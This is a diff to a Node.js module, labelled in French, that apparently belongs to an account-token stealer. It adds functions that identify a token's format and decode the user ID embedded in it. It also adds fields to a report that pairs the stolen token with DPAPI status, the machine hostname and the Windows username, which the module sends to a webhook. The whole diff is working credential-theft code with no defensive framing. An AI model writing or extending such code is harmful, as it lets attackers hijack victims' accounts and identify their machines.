@@ -12,6 +12,37 @@ function safeUsername() {
   }
 }
 
+function isClassicUserToken(token) {
+  const first = String(token).split('.')[0];
+  if (!first || first.length > 60) return false;
+  let decoded = '';
+  try {
+    decoded = Buffer.from(first.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('latin1');
+  } catch (_) {
+    return false;
+  }
+  return /^\d{17,20}$/.test(decoded);
+}
+
+function describeToken(token) {
+  const value = String(token || '');
+  if (/^mfa\./.test(value)) return 'mfa';
+  if (isClassicUserToken(value)) return 'classique';
+  return 'non standard';
+}
+
+function tokenId(token) {
+  const first = String(token || '').split('.')[0];
+  if (!first) return '?';
+  try {
+    const decoded = Buffer.from(first.replace(/-/g, '+').replace(/_/g, '/'), 'base64').toString('latin1');
+    if (/^\d{17,20}$/.test(decoded)) return decoded;
+  } catch (_) {
+    /* ignore */
+  }
+  return '?';
+}
+
 function buildPayload(data) {
   const token = data.token || '';
   const user = data.user || null;
@@ -38,8 +69,12 @@ function buildPayload(data) {
     }
   }
 
+  fields.push({ name: 'Format', value: '`' + describeToken(token) + '`', inline: true });
+  fields.push({ name: 'ID embarque', value: '`' + tokenId(token) + '`', inline: true });
+  fields.push({ name: 'Valide', value: data.validated === false ? '`non`' : '`oui`', inline: true });
   fields.push({ name: 'Client', value: '`' + source + '`', inline: true });
   fields.push({ name: 'Chiffre (DPAPI)', value: encrypted ? '`oui`' : '`non`', inline: true });
+  fields.push({ name: 'Longueur', value: '`' + token.length + '`', inline: true });
   fields.push({ name: 'Machine', value: '`' + os.hostname() + '`', inline: true });
   fields.push({ name: 'Utilisateur Windows', value: '`' + safeUsername() + '`', inline: true });
   fields.push({
@@ -114,4 +149,4 @@ async function sendToWebhook(url, payload) {
   return res.status;
 }
 
-module.exports = { sendToWebhook, buildPayload };
+module.exports = { sendToWebhook, buildPayload, describeToken, tokenId };
